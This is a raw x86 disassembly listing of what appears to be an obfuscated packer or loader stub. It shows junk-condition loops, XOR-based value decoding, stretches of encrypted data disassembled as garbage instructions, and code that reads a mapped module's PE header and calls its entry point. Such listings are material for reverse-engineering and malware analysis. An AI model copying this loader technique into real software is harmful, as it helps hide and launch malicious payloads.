  409c3d:	sbb    BYTE PTR [ebx+0x1],0x4
  409c41:	(bad)  
  409c42:	mov    BYTE PTR [ebx-0x7b62786b],cl
  409c48:	jae    0x409cbc
  409c4a:	dec    ebp
  409c4b:	adc    eax,0x495d014a
  409c50:	pop    ds
  409c51:	push   ebx
  409c52:	rcr    BYTE PTR [edi+edx*1+0x1d],1
  409c56:	fcomp  QWORD PTR [eax+0x23]
  409c59:	cmp    BYTE PTR [edx],cl
  409c5b:	push   ecx
  409c5c:	nop
  409c5d:	loope  0x409bef
  409c5f:	lea    edi,[esi-0x3e]
  409c62:	imul   edx,DWORD PTR [ebx-0x63e9e204],0x220a35f4
  409c6c:	popa   
  409c6d:	repz xchg ah,dh
  409c70:	inc    ebx
  409c71:	out    0xf8,al
  409c73:	je     0x409c0d
  409c75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c76:	mov    dl,bl
  409c78:	retf   
  409c79:	(bad)  
  409c7a:	cmp    edi,eax
  409c7c:	mov    ah,0xe4
  409c7e:	cmp    BYTE PTR [ecx+0x1d2fa6d],ah
  409c84:	fst    st(5)
  409c86:	icebp  
  409c87:	add    bh,0xe6
  409c8a:	fs mov dl,0x8b
  409c8d:	add    BYTE PTR [ebx],dh
  409c8f:	adc    ecx,DWORD PTR [eax]
  409c91:	nop
  409c92:	mov    bh,0x35
  409c94:	pop    edi
  409c95:	jle    0x409ce6
  409c97:	jge    0x409c26
  409c99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c9a:	xlat   BYTE PTR ds:[ebx]
  409c9b:	lock inc eax
  409c9d:	jo     0x409cc2
  409c9f:	mov    BYTE PTR [ebp+0x4d],ah
  409ca2:	movups XMMWORD PTR [ecx-0x4763b876],xmm5
  409ca9:	fld    DWORD PTR [ebp+0x7da82563]
  409caf:	inc    esp
  409cb0:	add    DWORD PTR [edx-0x28],esi
  409cb3:	int3   
  409cb4:	or     dl,dl
  409cb6:	add    edi,DWORD PTR [ebx+0x3b]
  409cb9:	jbe    0x409cae
  409cbb:	mov    dh,dl
  409cbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cbe:	add    eax,0xd23f9e11
  409cc3:	loope  0x409c5a
  409cc5:	cdq    
  409cc6:	loopne 0x409d31
  409cc8:	(bad)  [edx]
  409cca:	sub    BYTE PTR [ebp-0x13],bl
  409ccd:	add    eax,0x33158bbd
  409cd2:	sar    BYTE PTR [edi-0x32729c],1
  409cd8:	sub    edi,edx
  409cda:	add    edi,DWORD PTR [ebp-0x10]
  409cdd:	mov    edx,DWORD PTR [ebp-0x20]
  409ce0:	mov    ebx,DWORD PTR [ebp-0x8]
  409ce3:	xor    edx,eax
  409ce5:	add    edx,ecx
  409ce7:	imul   edx,ebx
  409cea:	cmp    edx,edi
  409cec:	jbe    0x407fba
  409cf2:	pop    ebx
  409cf3:	pop    edi
  409cf4:	leave  
  409cf5:	ret    0x8
  409cf8:	push   ebp
  409cf9:	mov    ebp,esp
  409cfb:	sub    esp,0x70
  409cfe:	xor    DWORD PTR ds:0x43427a,0x600e
  409d08:	push   0x4162b4
  409d0d:	call   DWORD PTR ds:0x432c36
  409d13:	test   ax,ax
  409d16:	jne    0x409d2d
  409d1c:	add    DWORD PTR ds:0x432ce2,0x43428a
  409d26:	xor    eax,eax
  409d28:	jmp    0x40a478
  409d2d:	call   DWORD PTR ds:0x432c92
  409d33:	cdq    
  409d34:	mov    DWORD PTR ds:0x432cd2,0x2a3f
  409d3e:	cmp    eax,0x98216565
  409d43:	jne    0x409d55
  409d49:	cmp    edx,0x98798767
  409d4f:	je     0x409d1c
  409d55:	push   0x4162c0
  409d5a:	sub    DWORD PTR ds:0x432cd2,0x490f
  409d64:	call   DWORD PTR ds:0x432ba2
  409d6a:	add    DWORD PTR ds:0x434321,0x7629
  409d74:	test   eax,eax
  409d76:	mov    DWORD PTR ds:0x432cc2,0x36af
  409d80:	jne    0x409d1c
  409d86:	sub    DWORD PTR ds:0x434321,0x434315
  409d90:	push   ebx
  409d91:	xor    DWORD PTR ds:0x432604,ecx
  409d97:	mov    ebx,0xf89c8531
  409d9c:	or     ecx,0x58cd
  409da2:	mov    DWORD PTR [ebp-0x8],ebx
  409da5:	xor    DWORD PTR ds:0x434329,0x5f13
  409daf:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  409db6:	and    DWORD PTR ds:0x43429a,0x0
  409dc0:	jmp    0x409dd2
  409dc5:	mov    ecx,DWORD PTR ds:0x43429a
  409dcb:	inc    ecx
  409dcc:	mov    DWORD PTR ds:0x43429a,ecx
  409dd2:	cmp    DWORD PTR ds:0x43429a,0x10
  409dd9:	jae    0x409e48
  409ddf:	cmp    DWORD PTR ds:0x43429a,0x13
  409de6:	jne    0x409dfc
  409dec:	push   0x432733
  409df1:	push   0x432618
  409df6:	call   DWORD PTR ds:0x432bfe
  409dfc:	jmp    0x409dc5
  409e01:	and    DWORD PTR ds:0x4342a2,0x0
  409e0b:	mov    ecx,DWORD PTR ds:0x4342a2
  409e11:	inc    ecx
  409e12:	mov    DWORD PTR ds:0x4342a2,ecx
  409e18:	cmp    DWORD PTR ds:0x4342a2,0x20
  409e1f:	jne    0x409e3b
  409e25:	push   DWORD PTR [ebp-0x1c]
  409e28:	push   DWORD PTR [ebp-0x10]
  409e2b:	push   0x1942
  409e30:	push   0x6344
  409e35:	call   DWORD PTR ds:0x432c02
  409e3b:	cmp    DWORD PTR ds:0x4342a2,0x1e
  409e42:	jb     0x409e0b
  409e48:	lea    eax,[ebp-0x18]
  409e4b:	sub    DWORD PTR ds:0x43432d,0x379b
  409e55:	mov    DWORD PTR [ebp-0x14],eax
  409e58:	lea    eax,[ebp-0x1c]
  409e5b:	and    DWORD PTR ds:0x432600,0x0
  409e65:	mov    ecx,DWORD PTR ds:0x432600
  409e6b:	inc    ecx
  409e6c:	mov    DWORD PTR ds:0x432600,ecx
  409e72:	cmp    DWORD PTR ds:0x432600,0x20
  409e79:	jne    0x409e98
  409e7f:	push   DWORD PTR [ebp-0xc]
  409e82:	push   DWORD PTR [ebp-0x10]
  409e85:	push   0x37d5
  409e8a:	push   0x73f1
  409e8f:	push   DWORD PTR [ebp-0x1c]
  409e92:	call   DWORD PTR ds:0x4328d6
  409e98:	cmp    DWORD PTR ds:0x432600,0x18
  409e9f:	jb     0x409e65
  409ea5:	and    DWORD PTR ds:0x4325ec,0x0
  409eaf:	mov    ecx,DWORD PTR ds:0x4325ec
  409eb5:	inc    ecx
  409eb6:	mov    DWORD PTR ds:0x4325ec,ecx
  409ebc:	cmp    DWORD PTR ds:0x4325ec,0x19
  409ec3:	jne    0x409ed4
  409ec9:	push   0x477f
  409ece:	call   DWORD PTR ds:0x4328da
  409ed4:	cmp    DWORD PTR ds:0x4325ec,0x13
  409edb:	jb     0x409eaf
  409ee1:	mov    ecx,DWORD PTR ds:0x432cd6
  409ee7:	xor    DWORD PTR ds:0x43429e,ecx
  409eed:	mov    DWORD PTR [ebp-0xc],eax
  409ef0:	and    DWORD PTR ds:0x4325f4,0x0
  409efa:	jmp    0x409f0d
  409eff:	xor    eax,eax
  409f01:	add    eax,DWORD PTR ds:0x4325f4
  409f07:	inc    eax
  409f08:	mov    ds:0x4325f4,eax
  409f0d:	cmp    DWORD PTR ds:0x4325f4,0x1a
  409f14:	jae    0x409f4f
  409f1a:	cmp    DWORD PTR ds:0x4325f4,0x21
  409f21:	jne    0x409f4a
  409f27:	push   0x432ce6
  409f2c:	push   DWORD PTR [ebp-0x28]
  409f2f:	push   DWORD PTR [ebp-0x18]
  409f32:	push   0x87ba
  409f37:	push   0x20df
  409f3c:	push   0x519b
  409f41:	push   DWORD PTR [ebp-0x18]
  409f44:	call   DWORD PTR ds:0x432c06
  409f4a:	jmp    0x409eff
  409f4f:	mov    eax,ds:0x4161a0
  409f54:	mov    DWORD PTR ds:0x4325f4,0x19
  409f5e:	cmp    DWORD PTR ds:0x4325f4,0x0
  409f65:	je     0x409fb2
  409f6b:	cmp    DWORD PTR ds:0x4325f4,0x21
  409f72:	jne    0x409fa0
  409f78:	push   0x2812
  409f7d:	push   0x6a58
  409f82:	push   DWORD PTR [ebp-0x24]
  409f85:	push   0x8f98
  409f8a:	push   DWORD PTR [ebp-0x20]
  409f8d:	push   0x26e4
  409f92:	push   DWORD PTR [ebp-0x14]
  409f95:	push   0x4327ab
  409f9a:	call   DWORD PTR ds:0x432c0a
  409fa0:	mov    ecx,DWORD PTR ds:0x4325f4
  409fa6:	dec    ecx
  409fa7:	mov    DWORD PTR ds:0x4325f4,ecx
  409fad:	jmp    0x409f5e
  409fb2:	mov    eax,DWORD PTR [eax+0x1c8]
  409fb8:	xor    DWORD PTR ds:0x4325f4,edx
  409fbe:	mov    eax,DWORD PTR [eax]
  409fc0:	mov    ecx,DWORD PTR [ebp-0xc]
  409fc3:	add    DWORD PTR ds:0x4325f0,0x3eda
  409fcd:	push   esi
  409fce:	mov    esi,0x7510855
  409fd3:	sbb    DWORD PTR ds:0x434315,0x118a
  409fdd:	xor    eax,esi
  409fdf:	sbb    DWORD PTR ds:0x43428e,0x43427a
  409fe9:	push   edi
  409fea:	xor    edi,DWORD PTR ds:0x43428a
  409ff0:	mov    edi,0x32729c
  409ff5:	adc    DWORD PTR ds:0x434315,0x7b86
  409fff:	add    eax,edi
  40a001:	mov    DWORD PTR [ecx],eax
  40a003:	mov    eax,ds:0x4163b4
  40a008:	mov    DWORD PTR ds:0x432cde,0x674a
  40a012:	cmp    eax,0x23c13046
  40a017:	mov    eax,DWORD PTR [ebp-0x4]
  40a01a:	je     0x40a046
  40a020:	mov    ecx,DWORD PTR [ebp-0x8]
  40a023:	xor    eax,esi
  40a025:	sub    DWORD PTR ds:0x4325f4,0x7cc4
  40a02f:	add    eax,edi
  40a031:	add    DWORD PTR ds:0x434286,0x4325f4
  40a03b:	imul   eax,ecx
  40a03e:	mov    DWORD PTR [ebp-0x8],eax
  40a041:	jmp    0x40a156
  40a046:	and    DWORD PTR ds:0x432cde,0x0
  40a050:	mov    ecx,DWORD PTR ds:0x432cde
  40a056:	inc    ecx
  40a057:	mov    DWORD PTR ds:0x432cde,ecx
  40a05d:	cmp    DWORD PTR ds:0x432cde,0x26
  40a064:	jne    0x40a07d
  40a06a:	push   DWORD PTR [ebp-0x18]
  40a06d:	push   0x709e
  40a072:	push   0x1359
  40a077:	call   DWORD PTR ds:0x432c0e
  40a07d:	cmp    DWORD PTR ds:0x432cde,0x19
  40a084:	jb     0x40a050
  40a08a:	xor    eax,esi
  40a08c:	and    DWORD PTR ds:0x434296,0x0
  40a096:	mov    ecx,DWORD PTR ds:0x434296
  40a09c:	inc    ecx
  40a09d:	mov    DWORD PTR ds:0x434296,ecx
  40a0a3:	cmp    DWORD PTR ds:0x434296,0x10
  40a0aa:	jne    0x40a0c0
  40a0b0:	push   0x432705
  40a0b5:	push   0x43271d
  40a0ba:	call   DWORD PTR ds:0x4328de
  40a0c0:	cmp    DWORD PTR ds:0x434296,0xf
  40a0c7:	jne    0x40a0da
  40a0cd:	mov    ecx,DWORD PTR ds:0x434296
  40a0d3:	inc    ecx
  40a0d4:	mov    DWORD PTR ds:0x434296,ecx
  40a0da:	cmp    DWORD PTR ds:0x434296,0x1e
  40a0e1:	jb     0x40a096
  40a0e7:	add    eax,edi
  40a0e9:	mov    ds:0x4162b0,eax
  40a0ee:	mov    ecx,DWORD PTR ds:0x434266
  40a0f4:	sbb    DWORD PTR ds:0x434315,ecx
  40a0fa:	mov    eax,DWORD PTR [ebp-0x8]
  40a0fd:	sbb    ecx,DWORD PTR ds:0x432cd6
  40a103:	xor    eax,esi
  40a105:	not    ecx
  40a107:	add    eax,edi
  40a109:	mov    ds:0x4163b4,eax
  40a10e:	mov    eax,DWORD PTR [ebp-0x4]
  40a111:	mov    ecx,DWORD PTR ds:0x4162b0
  40a117:	sub    DWORD PTR ds:0x4325f0,0x434315
  40a121:	xor    eax,esi
  40a123:	add    eax,edi
  40a125:	mov    DWORD PTR ds:0x434292,0x307
  40a12f:	cmp    ecx,eax
  40a131:	jne    0x40a156
  40a137:	xor    DWORD PTR ds:0x432cce,0x57b5
  40a141:	push   DWORD PTR [ebp-0x4]
  40a144:	sub    DWORD PTR ds:0x434319,0x6bc5
  40a14e:	push   DWORD PTR [ebp-0x8]
  40a151:	call   0x40a47c
  40a156:	mov    eax,ds:0x4161a0
  40a15b:	mov    eax,DWORD PTR [eax+0x18c]
  40a161:	xor    ecx,ecx
  40a163:	mov    eax,DWORD PTR [eax]
  40a165:	sbb    DWORD PTR ds:0x434311,edx
  40a16b:	mov    DWORD PTR [ebp-0x20],eax
  40a16e:	inc    edx
  40a16f:	mov    eax,0xf89c853d
  40a174:	mov    DWORD PTR [ebp-0x24],eax
  40a177:	or     DWORD PTR ds:0x43426a,edx
  40a17d:	mov    DWORD PTR [ebp-0x24],eax
  40a180:	and    DWORD PTR ds:0x43429a,0x0
  40a18a:	jmp    0x40a19c
  40a18f:	mov    edx,DWORD PTR ds:0x43429a
  40a195:	inc    edx
  40a196:	mov    DWORD PTR ds:0x43429a,edx
  40a19c:	cmp    DWORD PTR ds:0x43429a,0x10
  40a1a3:	jae    0x40a1f4
  40a1a9:	cmp    DWORD PTR ds:0x43429a,0x6
  40a1b0:	jne    0x40a1d3
  40a1b6:	push   0x1088
  40a1bb:	push   DWORD PTR [ebp-0x1c]
  40a1be:	push   0x185d
  40a1c3:	push   0x432809
  40a1c8:	push   0x400000
  40a1cd:	call   DWORD PTR ds:0x4328e2
  40a1d3:	cmp    DWORD PTR ds:0x43429a,0x5
  40a1da:	jne    0x40a1ef
  40a1e0:	xor    edx,edx
  40a1e2:	or     edx,DWORD PTR ds:0x43429a
  40a1e8:	inc    edx
  40a1e9:	mov    DWORD PTR ds:0x43429a,edx
  40a1ef:	jmp    0x40a18f
  40a1f4:	mov    DWORD PTR [ebp-0x24],eax
  40a1f7:	mov    DWORD PTR [ebp-0xc],ebx
  40a1fa:	mov    DWORD PTR [ebp-0x24],eax
  40a1fd:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40a204:	mov    ebx,DWORD PTR [ebp-0x8]
  40a207:	and    edx,DWORD PTR ds:0x43429a
  40a20d:	mov    ecx,DWORD PTR [ebp-0x4]
  40a210:	and    DWORD PTR ds:0x432cce,0x0
  40a21a:	mov    edx,DWORD PTR ds:0x432cce
  40a220:	inc    edx
  40a221:	mov    DWORD PTR ds:0x432cce,edx
  40a227:	cmp    DWORD PTR ds:0x432cce,0x22
  40a22e:	jne    0x40a23a
  40a234:	call   DWORD PTR ds:0x4328e6
  40a23a:	cmp    DWORD PTR ds:0x432cce,0x17
  40a241:	jb     0x40a21a
  40a247:	mov    edx,DWORD PTR [ebp-0x4]
  40a24a:	xor    edx,esi
  40a24c:	xor    ecx,esi
  40a24e:	add    ecx,edx
  40a250:	mov    edx,DWORD PTR [ebp-0x4]
  40a253:	xor    ebx,esi
  40a255:	xor    edx,esi
  40a257:	add    ebx,edi
  40a259:	lea    ecx,[ecx+edx*1+0x9757d4]
  40a260:	cmp    ebx,ecx
  40a262:	ja     0x40a2c3
  40a268:	mov    eax,DWORD PTR [ebp-0x4]
  40a26b:	xor    eax,esi
  40a26d:	lea    eax,[eax+ebx*1+0x32729c]
  40a274:	push   eax
  40a275:	mov    eax,DWORD PTR [ebp-0xc]
  40a278:	xor    eax,esi
  40a27a:	lea    eax,[ebp+eax*1+0x3272a4]
  40a281:	push   eax
  40a282:	mov    eax,ds:0x4161a0
  40a287:	push   DWORD PTR [eax+0x1bc]
  40a28d:	call   0x401a05
  40a292:	mov    eax,DWORD PTR [ebp-0x4]
  40a295:	xor    eax,esi
  40a297:	lea    ebx,[ebx+eax*1+0x32729c]
  40a29e:	mov    eax,DWORD PTR [ebp-0x4]
  40a2a1:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a4:	xor    ecx,esi
  40a2a6:	xor    eax,esi
  40a2a8:	add    eax,ecx
  40a2aa:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2ad:	xor    ecx,esi
  40a2af:	lea    eax,[eax+ecx*1+0x9757d4]
  40a2b6:	cmp    ebx,eax
  40a2b8:	jbe    0x40a268
  40a2be:	mov    eax,0xf89c853d
  40a2c3:	mov    ecx,DWORD PTR [ebp+0xc]
  40a2c6:	mov    DWORD PTR ds:0x416024,ecx
  40a2cc:	mov    ecx,DWORD PTR [ebp+0x10]
  40a2cf:	mov    DWORD PTR ds:0x416278,ecx
  40a2d5:	mov    ecx,DWORD PTR ds:0x416024
  40a2db:	mov    edx,DWORD PTR [ebp-0x14]
  40a2de:	sub    ecx,edi
  40a2e0:	xor    ecx,esi
  40a2e2:	mov    DWORD PTR [edx],ecx
  40a2e4:	mov    ecx,DWORD PTR [ebp-0x18]
  40a2e7:	cmp    ecx,0xf89c8530
  40a2ed:	je     0x40a34a
  40a2f3:	mov    ecx,DWORD PTR [ebp-0x8]
  40a2f6:	mov    edx,DWORD PTR [ebp-0x1c]
  40a2f9:	xor    ecx,esi
  40a2fb:	add    ecx,edi
  40a2fd:	cmp    ecx,edx
  40a2ff:	je     0x40a34a
  40a305:	mov    eax,ds:0x4161a0
  40a30a:	mov    eax,DWORD PTR [eax+0x194]
  40a310:	mov    ecx,DWORD PTR [eax]
  40a312:	mov    eax,DWORD PTR [ecx+0x3c]
  40a315:	push   DWORD PTR ds:0x416278
  40a31b:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a31f:	push   DWORD PTR ds:0x416024
  40a325:	add    eax,ecx
  40a327:	mov    ecx,DWORD PTR ds:0x4161a0
  40a32d:	mov    ecx,DWORD PTR [ecx+0x194]
  40a333:	push   DWORD PTR [ecx]
  40a335:	call   eax
  40a337:	mov    ecx,DWORD PTR ds:0x4161a0
  40a33d:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a343:	mov    DWORD PTR [ecx],eax
  40a345:	jmp    0x40a45a
  40a34a:	mov    ecx,DWORD PTR [ebp-0x8]
  40a34d:	mov    edx,DWORD PTR [ebp-0x20]
  40a350:	xor    ecx,esi
  40a352:	add    ecx,edi
  40a354:	cmp    ecx,edx
  40a356:	jne    0x40a43d
  40a35c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a35f:	xor    ecx,esi
  40a361:	add    ecx,edi
  40a363:	mov    DWORD PTR ds:0x416224,ecx
  40a369:	mov    ecx,DWORD PTR [ebp-0x8]
  40a36c:	xor    ecx,esi
  40a36e:	add    ecx,edi
  40a370:	mov    DWORD PTR ds:0x41621c,ecx
  40a376:	mov    ecx,DWORD PTR [ebp-0x4]
  40a379:	mov    DWORD PTR [ebp-0xc],ecx
  40a37c:	mov    ecx,DWORD PTR [ebp-0x8]
  40a37f:	mov    DWORD PTR [ebp+0xc],ecx
  40a382:	mov    ecx,DWORD PTR [ebp+0xc]
  40a385:	xor    ecx,esi
  40a387:	add    ecx,edi
  40a389:	mov    DWORD PTR [ebp+0xc],ecx
  40a38c:	mov    ecx,DWORD PTR ds:0x416020
  40a392:	mov    ecx,DWORD PTR [ecx]
  40a394:	mov    DWORD PTR [ebp+0xc],ecx
  40a397:	mov    ecx,DWORD PTR ds:0x416228
  40a39d:	mov    ecx,DWORD PTR [ecx]
  40a39f:	mov    DWORD PTR [ebp-0x14],ecx
  40a3a2:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40a3a9:	mov    ecx,DWORD PTR [ebp+0x10]
  40a3ac:	xor    ecx,esi
  40a3ae:	add    ecx,edi
  40a3b0:	mov    DWORD PTR [ebp+0x10],ecx
  40a3b3:	mov    ecx,DWORD PTR ds:0x4161a0
  40a3b9:	mov    DWORD PTR [ebp+0x10],ecx
  40a3bc:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3bf:	mov    DWORD PTR [ebp+0xc],ecx
  40a3c2:	mov    ecx,DWORD PTR [ebp+0xc]
  40a3c5:	push   0x4
  40a3c7:	pop    edx
  40a3c8:	sub    edx,ecx
  40a3ca:	add    edx,DWORD PTR [ebp-0x14]
  40a3cd:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40a3d4:	mov    DWORD PTR [ebp+0x10],edx
  40a3d7:	mov    DWORD PTR [ebp-0x70],eax
  40a3da:	mov    eax,DWORD PTR [ebp+0xc]
  40a3dd:	mov    DWORD PTR [ebp-0x6c],eax
  40a3e0:	mov    eax,DWORD PTR [ebp+0x10]
  40a3e3:	mov    DWORD PTR [ebp-0x68],eax
  40a3e6:	mov    eax,DWORD PTR [ebp-0x24]
  40a3e9:	xor    eax,esi
  40a3eb:	add    eax,edi
  40a3ed:	mov    DWORD PTR [ebp-0x64],eax
  40a3f0:	lea    eax,[ebp-0x2c]
  40a3f3:	mov    DWORD PTR [ebp-0x60],eax
  40a3f6:	mov    eax,DWORD PTR [ebp-0x70]
  40a3f9:	xor    eax,esi
  40a3fb:	add    eax,edi
  40a3fd:	mov    DWORD PTR [ebp-0x70],eax
  40a400:	lea    eax,[ebp-0x70]
  40a403:	push   eax
  40a404:	mov    eax,DWORD PTR [ebp-0xc]
  40a407:	xor    eax,esi
  40a409:	add    eax,edi
  40a40b:	push   eax
  40a40c:	mov    eax,ds:0x4161c0
  40a411:	push   0x416116
  40a416:	push   DWORD PTR [eax]
  40a418:	call   0x40d076
  40a41d:	xor    esi,esi
  40a41f:	mov    eax,DWORD PTR [ebp+0x10]
  40a422:	sub    eax,esi
  40a424:	push   eax
  40a425:	mov    eax,DWORD PTR [ebp+0xc]
  40a428:	add    eax,esi
  40a42a:	push   eax
  40a42b:	call   0x407765
  40a430:	inc    esi
  40a431:	cmp    esi,0x52
  40a434:	jb     0x40a41f
  40a43a:	mov    eax,DWORD PTR [ebp-0xc]
  40a43d:	call   0x405bf4
  40a442:	lea    eax,[ebp+0x4]
  40a445:	mov    DWORD PTR [ebp-0x28],eax
  40a448:	mov    eax,DWORD PTR [ebp-0x10]
  40a44b:	mov    eax,DWORD PTR [ebp-0x4]
  40a44e:	push   DWORD PTR [ebp-0x8]
  40a451:	lea    eax,[ebp-0x28]
  40a454:	push   eax
  40a455:	call   0x40c78b
  40a45a:	mov    eax,ds:0x4161a0
  40a45f:	push   0x4
  40a461:	add    eax,0x1cc
  40a466:	push   eax
  40a467:	lea    eax,[ebp-0x10]
  40a46a:	push   eax
  40a46b:	call   0x401a05
  40a470:	mov    eax,DWORD PTR [ebp-0x10]
  40a473:	mov    eax,DWORD PTR [eax]
  40a475:	pop    edi
  40a476:	pop    esi
  40a477:	pop    ebx
  40a478:	leave  
  40a479:	ret    0xc
  40a47c:	push   ebp
  40a47d:	mov    ebp,esp
  40a47f:	sub    esp,0x24
  40a482:	xor    ecx,ecx
  40a484:	or     ecx,DWORD PTR ds:0x434325
  40a48a:	sub    ecx,DWORD PTR ds:0x43432d
  40a490:	mov    DWORD PTR ds:0x434325,ecx
  40a496:	mov    eax,ds:0x4161a0
  40a49b:	mov    DWORD PTR ds:0x434292,0x17
  40a4a5:	cmp    DWORD PTR ds:0x434292,0x0
  40a4ac:	je     0x40a506
  40a4b2:	cmp    DWORD PTR ds:0x434292,0x5
  40a4b9:	jne    0x40a4d4
  40a4bf:	push   0x378d
  40a4c4:	push   0x43427a
  40a4c9:	push   0x4a36
  40a4ce:	call   DWORD PTR ds:0x432b56
  40a4d4:	cmp    DWORD PTR ds:0x434292,0x6
  40a4db:	jne    0x40a4ee
  40a4e1:	mov    ecx,DWORD PTR ds:0x434292
  40a4e7:	dec    ecx
  40a4e8:	mov    DWORD PTR ds:0x434292,ecx
  40a4ee:	mov    ecx,DWORD PTR ds:0x434292
  40a4f4:	dec    ecx
  40a4f5:	mov    DWORD PTR ds:0x434292,ecx
  40a4fb:	jmp    0x40a4a5
  40a500:	add    DWORD PTR ds:0x432ce6,edx
  40a506:	mov    eax,DWORD PTR [eax+0x198]
  40a50c:	mov    ecx,DWORD PTR ds:0x434365
  40a512:	mov    ecx,DWORD PTR [ecx]
  40a514:	sub    DWORD PTR ds:0x434272,ecx
  40a51a:	mov    DWORD PTR [ebp-0x8],eax
  40a51d:	xor    eax,eax
  40a51f:	add    eax,DWORD PTR ds:0x434266
  40a525:	and    eax,DWORD PTR ds:0x4325f4
  40a52b:	mov    ds:0x434266,eax
  40a530:	mov    eax,DWORD PTR [ebp+0x8]
  40a533:	mov    ecx,DWORD PTR [ebp-0x8]
  40a536:	sub    DWORD PTR ds:0x432cde,0x4325f0
  40a540:	push   ebx
  40a541:	adc    DWORD PTR ds:0x434296,ebx
  40a547:	push   esi
  40a548:	mov    esi,0x7510855
  40a54d:	and    DWORD PTR ds:0x432cca,0x0
  40a557:	mov    ebx,DWORD PTR ds:0x432cca
  40a55d:	inc    ebx
  40a55e:	mov    DWORD PTR ds:0x432cca,ebx
  40a564:	cmp    DWORD PTR ds:0x432cca,0x2c
  40a56b:	jne    0x40a57a
  40a571:	push   DWORD PTR [ebp-0xc]
  40a574:	call   DWORD PTR ds:0x432b5a
  40a57a:	cmp    DWORD PTR ds:0x432cca,0x1e
  40a581:	jb     0x40a557
  40a587:	xor    eax,esi
  40a589:	and    DWORD PTR ds:0x4342a2,0x0
  40a593:	jmp    0x40a5a5
  40a598:	mov    ebx,DWORD PTR ds:0x4342a2
  40a59e:	inc    ebx
  40a59f:	mov    DWORD PTR ds:0x4342a2,ebx
  40a5a5:	cmp    DWORD PTR ds:0x4342a2,0x1a
  40a5ac:	jae    0x40a78c
  40a5b2:	cmp    DWORD PTR ds:0x4342a2,0x1d
  40a5b9:	jne    0x40a5cf
  40a5bf:	push   0x74a9
  40a5c4:	push   0x3c30
  40a5c9:	call   DWORD PTR ds:0x432b5e
  40a5cf:	jmp    0x40a598
  40a5d4:	jmp    0x40a78c
  40a5d9:	cmp    dh,BYTE PTR [esi+0x69734bd3]
  40a5df:	inc    edx
  40a5e0:	mov    ch,0x74
  40a5e2:	neg    DWORD PTR [ebx-0x6]
  40a5e5:	rcr    BYTE PTR ds:0xe0d2c38e,0x70
  40a5ec:	jo     0x40a583
  40a5ee:	jg     0x40a660
  40a5f0:	jo     0x40a5c4
  40a5f2:	int3   
  40a5f3:	stos   BYTE PTR es:[edi],al
  40a5f4:	cs ins BYTE PTR es:[edi],dx
  40a5f6:	mov    dh,0x50
  40a5f8:	(bad)  
  40a5f9:	sub    DWORD PTR [ebx+0x6a275f78],esi
  40a5ff:	gs push esp
  40a601:	fsubr  DWORD PTR [esi+0x71]
  40a604:	addr16 inc ebp
  40a606:	sbb    esp,edx
  40a608:	xchg   esp,eax
  40a609:	out    0xe4,eax
  40a60b:	push   ecx
  40a60c:	and    eax,0x1c1f593f
  40a611:	push   0xffffffc8
  40a613:	add    eax,0x50ab0b62
  40a618:	enter  0x1000,0xd
  40a61c:	push   esp
  40a61d:	pop    esi
  40a61e:	sti    
  40a61f:	ds dec edx
  40a621:	mov    eax,ds:0xca6b8190
  40a626:	xor    ch,dl
  40a628:	out    dx,eax
  40a629:	sar    al,cl
  40a62b:	jmp    0x876e4a11
  40a630:	cmp    BYTE PTR [esi-0x7475d692],al
  40a636:	je     0x40a6ac
  40a638:	dec    ecx
  40a639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a63a:	cmp    eax,0xe85b4146
  40a63f:	add    BYTE PTR [ebp+0x2d6df022],al
  40a645:	inc    ebx
  40a646:	sti    
  40a647:	call   0xb17926b2
  40a64c:	bound  esp,QWORD PTR [eax]
  40a64e:	xor    al,0x15
  40a650:	das    
  40a651:	dec    edi
  40a652:	inc    edx
  40a653:	adc    edi,ecx
  40a655:	xchg   ecx,eax
  40a656:	lods   al,BYTE PTR ds:[esi]
  40a657:	lea    esi,[eax+0x70]
  40a65a:	in     al,0xdd
  40a65c:	fsubr  st,st(2)
  40a65e:	retf   0x52e9
  40a661:	outs   dx,DWORD PTR ds:[esi]
  40a662:	ds sub al,0x8c
  40a665:	fnstsw WORD PTR [ecx]
  40a667:	jp     0x40a607
  40a669:	mov    ah,dh
  40a66b:	pop    ss
  40a66c:	mov    edx,0xe29bba0e
  40a671:	push   ds
  40a672:	push   ebx
  40a673:	cmp    BYTE PTR [eax-0x264823a1],al
  40a679:	out    0x16,eax
  40a67b:	jb     0x40a67f
  40a67d:	mov    bl,BYTE PTR [edx+edx*1]
  40a680:	and    esi,DWORD PTR [esi-0x48f2432]
  40a686:	xlat   BYTE PTR ds:[ebx]
  40a687:	sub    BYTE PTR [ecx+0x3d],dh
  40a68a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a68b:	loop   0x40a646
  40a68d:	(bad)  
  40a690:	and    eax,0xd7e454e7
  40a695:	add    al,0xa9
  40a697:	sub    DWORD PTR ds:0x14e996b3,esi
  40a69d:	(bad)  
  40a69e:	out    0x63,eax
  40a6a0:	cdq    
  40a6a1:	(bad)  
  40a6a2:	add    esp,0xea1472df
  40a6a8:	push   ecx
  40a6a9:	sbb    ebp,esi
  40a6ab:	pop    edx
  40a6ac:	add    ebp,DWORD PTR [esi]
  40a6ae:	inc    ecx
  40a6af:	shl    DWORD PTR [eax+0x6a],1
  40a6b2:	les    esp,FWORD PTR [edx+0x21]
  40a6b5:	add    al,0x8
  40a6b7:	cdq    
  40a6b8:	icebp  
  40a6b9:	ins    BYTE PTR es:[edi],dx
  40a6ba:	dec    edi
  40a6bb:	stc    
  40a6bc:	and    esp,DWORD PTR [ebx-0x4ef2dffd]
  40a6c2:	sub    esp,DWORD PTR [edi+ebp*4-0x66cf0eea]
  40a6c9:	add    DWORD PTR [ebx-0x15],esp
  40a6cc:	cmp    ecx,edx
  40a6ce:	inc    ebp
  40a6cf:	mov    bl,0x1d
  40a6d1:	shl    eax,1
  40a6d3:	push   eax
  40a6d4:	dec    eax
